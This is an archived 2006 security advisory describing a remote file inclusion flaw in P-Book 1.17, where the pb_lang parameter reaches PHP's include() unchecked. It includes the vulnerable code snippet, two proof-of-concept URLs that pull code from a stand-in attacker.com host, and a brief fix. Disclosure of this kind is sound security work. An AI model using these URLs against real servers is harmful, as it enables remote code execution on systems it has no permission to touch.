@@ -1,0 +1,81 @@
+____________________   ___ ___ ________
+\_   _____/\_   ___ \ /   |   \\_____  \
+ |    __)_ /    \  \//    ~    \/   |   \
+ |        \\     \___\    Y    /    |    \
+/_______  / \______  /\___|_  /\_______  /
+        \/         \/       \/         \/                              .OR.ID
+ECHO_ADV_56$2006
+
+------------------------------------------------------------------------------
+[ECHO_ADV_56$2006] P-Book <= 1.17 (pb_lang) Remote File Inclusion
+------------------------------------------------------------------------------
+
+Author		: Ahmad Maulana a.k.a Matdhule
+Date Found	: October, 18th 2006
+Location	: Indonesia, Jakarta
+web		: http://advisories.echo.or.id/adv/adv56-matdhule-2006.txt
+Critical Lvl	: Highly critical
+Impact		: System access
+Where		: From Remote
+---------------------------------------------------------------------------
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+Application	: P-Book
+version		: 1.17
+URL		: http://www.PPoPn.net
+
+---------------------------------------------------------------------------
+
+Vulnerability:
+~~~~~~~~~~~~~~
+
+I found vulnerability script admin.php
+
+-----------------------admin.php----------------------
+....
+<?
+
+$time = $reload * 60;
+include("$pb_lang/language.php");
+...
+----------------------------------------------------------
+
+Input passed to the "pb_lang" parameter in admin.php is not
+properly verified before being used. This can be exploited to execute
+arbitrary PHP code by including files from local or external
+resources.
+
+Also affected files:
+pbook.php
+
+Proof Of Concept:
+~~~~~~~~~~~~~~~
+
+http://target.com/[p-book_path]/admin.php?pb_lang=http://attacker.com/inject.txt?
+http://target.com/[p-book_path]/pbook.php?pb_lang=http://attacker.com/inject.txt?
+
+Solution:
+~~~~~~~
+- Sanitize variable $pb_lang on affected files.
+
+---------------------------------------------------------------------------
+Shoutz:
+~~~
+~ solpot a.k.a chris, J4mbi  H4ck3r thx for the hacking lesson    :)   
+~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,anonymous
+~ bius, lapets, ghoz, t4mbun_hacker, NpR, h4ntu, thama
+~ newbie_hacker@yahoogroups.com, jasakom_perjuangan@yahoogroups.com
+~ Solpotcrew Comunity (#nyubicrew), #e-c-h-o @irc.dal.net
+------------------------------------------------------------------------
+---
+Contact:
+~~~~
+ 
+     matdhule[at]gmail[dot]com
+     
+-------------------------------- [ EOF ]----------------------------------
+
+# milw0rm.com [2006-10-31]
